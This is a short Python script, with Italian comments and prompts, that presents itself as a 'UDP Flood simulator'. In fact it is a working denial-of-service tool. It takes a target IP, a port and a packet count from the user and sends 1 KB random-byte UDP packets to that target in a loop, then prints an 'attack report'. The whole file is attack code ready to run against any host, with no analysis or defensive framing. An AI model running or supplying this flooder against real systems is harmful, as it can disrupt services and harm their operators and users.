import socket
import random
from tqdm import tqdm # Per la barra di avanzamento
from colorama import Fore, Style, init # Per aggiungere colori ai messaggi

# Inizializza la libreria colorama per supportare i colori
init ()

def udp_flood():
    print(f"{Fore.CYAN}Benvenuto al simulatore di UDP Flood!{Style.RESET_ALL}")

    # Input per IP e porta del target
    target_ip = input(f"{Fore.YELLOW}Inserisci l'IP della macchina target: {Style.RESET_ALL}")
    target_port = int(input(f"{Fore.YELLOW}Inserisci la porta UDP della macchina target: {Style.RESET_ALL}"))

    # Input per il numero di pacchetti da inviare
    num_packets = int(input(f"{Fore.YELLOW}Inserisci il numero di pacchetti da 1 KB da inviare: {Style.RESET_ALL}"))

    # Creazione di un pacchetto di 1 KB con dati casuali
    packet = random._urandom(1024) # 1024 byte = 1 KB

    # Creazione del socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print(f"\n{Fore.GREEN}Preparazione per l'attacco UDP flood verso {target_ip}:{target_port}...{Style.RESET_ALL}\n")

    # Barra di avanzamento e ciclo per inviare i pacchetti
    success_count = 0
    error_count = 0
    for i in tqdm(range(num_packets), desc="Invio pacchetti", unit="pacchetto"):
        try:
            sock.sendto(packet, (target_ip, target_port))
            success_count += 1
        except Exception as e:
            error_count += 1

    # Chiudi il socket
    sock.close()

    # Report finale
    print(f"\n{Fore.BLUE}Report dell'attacco:{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Pacchetti inviati con successo: {success_count}{Style.RESET_ALL}")
    print(f"{Fore.RED}Pacchetti falliti: {error_count}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Attacco completato!{Style.RESET_ALL}")

# Avvia la funzione
udp_flood()